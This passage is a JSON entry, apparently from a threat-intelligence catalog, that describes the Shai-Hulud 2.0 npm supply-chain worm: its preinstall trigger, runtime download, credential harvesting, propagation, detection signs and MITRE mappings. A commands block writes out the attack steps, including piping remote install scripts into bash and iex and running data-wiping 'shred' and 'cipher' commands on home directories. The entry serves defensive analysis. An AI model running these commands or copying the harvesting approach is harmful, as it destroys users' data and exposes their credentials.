  "metadata": {
    "descriptionHtml": "<p><strong>Shai-Hulud 2.0</strong> is a highly aggressive supply chain worm that compromised over 790 npm packages in November 2025. Unlike typical malicious packages, it employs a <strong>'Bring Your Own Runtime'</strong> strategy by dynamically installing the <span style='color:#ef4444;font-weight:bold;'>Bun</span> runtime to evade Node.js-based security heuristics.</p><p>The attack flow executes immediately during the <span style='color:#ef4444;font-weight:bold;'>preinstall</span> phase:</p><ol><li><strong>Infection</strong>: Victim runs <span style='color:#ef4444;font-weight:bold;'>npm install</span> on a compromised dependency.</li><li><strong>Evasion</strong>: The script <code>setup_bun.js</code> downloads and installs Bun, then detaches a massive (10MB+) obfuscated payload process.</li><li><strong>Harvesting</strong>: It scans the filesystem (using logic similar to TruffleHog) for AWS keys, NPM tokens, and GitHub credentials.</li><li><strong>Worming & Exfiltration</strong>: Stolen credentials are used to creating new malicious GitHub repositories (C2) and publish infected versions of the victim's own packages.</li><li><strong>Destruction</strong>: A 'Dead Man\\'s Switch' monitors connectivity; if blocked, it triggers a wiper (<span style='color:#ef4444;font-weight:bold;'>shred</span> or <span style='color:#ef4444;font-weight:bold;'>cipher</span>) to destroy user data.</li></ol>",
    "commandsBlock": "# Step 1: Malicious preinstall triggers Bun setup\n$ npm install compromised-package\n\n# Step 2: Malware downloads Bun (Linux/Mac)\n$ curl -fsSL https://bun.sh/install | bash\n\n# Step 3: Malware downloads Bun (Windows)\n$ powershell -c \"irm bun.sh/install.ps1|iex\"\n\n# Step 4: Detached payload execution\n$ bun bun_environment.js\n\n# Step 5: Wiper execution (If C2 blocked)\n$ shred -uvz -n 1 /home/user/*\n$ cipher /W:%USERPROFILE%",
    "prerequisites": [
      "Victim installs a compromised npm package",
      "Outbound network access to bun.sh and api.github.com",
      "Credentials stored in standard locations (~/.aws, .env, .npmrc)"
    ],
    "attackerGains": [
      "NPM publishing tokens for further propagation",
      "GitHub PATs for repository access",
      "AWS/Cloud credentials for resource hijacking",
      "Persistent backdoor via self-hosted runners"
    ],
    "detectionNotes": [
      "Process 'bun' spawned by 'node' or 'npm'",
      "Network traffic to webhook.site/bb8ca5f6-...",
      "Creation of GitHub repos with description 'Sha1-Hulud'",
      "Large (>5MB) JavaScript files in node_modules"
    ],
    "mitreCategories": [
      "T1195.001",
      "T1059.007",
      "T1552.001",
      "T1567",
      "T1485"
    ],
    "extraInfo": [
